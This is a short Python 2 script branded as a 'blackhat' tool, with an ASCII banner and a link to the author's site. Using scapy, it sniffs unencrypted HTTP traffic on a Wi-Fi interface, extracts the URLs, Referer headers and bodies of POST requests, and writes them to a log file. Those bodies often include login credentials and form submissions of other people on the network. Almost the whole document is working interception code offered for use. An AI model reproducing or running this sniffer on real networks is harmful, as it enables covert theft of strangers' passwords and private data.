#!/usr/bin/python
# -*- coding: utf-8 -*-



import sys
import time
import random

# colour 
G = "\033[32m"; O = "\033[32m"; B = "\033[32m"; R = "\033[32m"; W = "\033[32m"; P = "\033[32m";

print O+("")
mess = """
echo "                  _                    _                _   ";
echo "  _ __   ___  ___| |_    /\ /\__ _ ___| |__  _ __ _   _| |_ ";
echo " | '_ \ / _ \/ __| __|  / //_/ _\` / __| '_ \| '__| | | | __|";
echo " | |_) | (_) \__ \ |_  / __ \ (_| \__ \ | | | |  | |_| | |_ ";
echo " | .__/ \___/|___/\__| \/  \/\__,_|___/_| |_|_|   \__,_|\__|";
echo " |_|                                                        ";


                                                         """

print mess
print "                create  by world-blackhat"
print "                It analyzes the post"
print "  Note :▂▃▄▅▆▇█▓▒░You must connect to a Wi-Fi network to analyze░▒▓█▇▆▅▄▃▂"


def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.3)
mengetik('&_<︻╦̵̵͇̿̿̿̿ vist our site ╤───.......┣▇ https://www.blackhat-x4.ga  ▇▇▇▇▇═─ ')




import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

log = open('postkashrut.log', 'ab')

prev_ack = 0
prev_body = ''
interface = 'wlan0'

def cb(pkt):
	global prev_ack, prev_body

	post_found = 0
	if pkt.haslayer(Raw):

		load = pkt[Raw].load

		try:
			headers, body = load.split(r"\r\n\r\n", 1)
		except:
			headers = load
			body = ''

		ack = pkt[TCP].ack
		if prev_ack == ack:
			newBody = prev_body+headers
			print 'Fragment found; combined body:\n\n', newBody
			print '-----------------------------------------'
			prev_body = newBody
			log.write('Fragment found; combined body:\n\n'+newBody+'\n-----------------------------------------\n')
			return

		header_lines = headers.split(r"\r\n")
		for h in header_lines:
			if 'post /' in h.lower():
				post_found = h.split(' ')[1]
		if post_found:
			for h in header_lines:
				if 'host: ' in h.lower():
					host = h.split(' ')[1]
					print 'URL:',host+post_found
				elif 'referer: ' in h.lower():
					print h

			prev_body = body
			prev_ack = ack

			if body != '':
				print '\n'+body
				print '-----------------------------------------'

			log.write(pkt.summary()+'\n')
			for h in header_lines:
				log.write(h+"\n")
			if body != '':
				log.write(body)
			log.write('\n-----------------------------------------\n')

sniff(iface=interface, filter='tcp port 80', prn=cb, store=0)
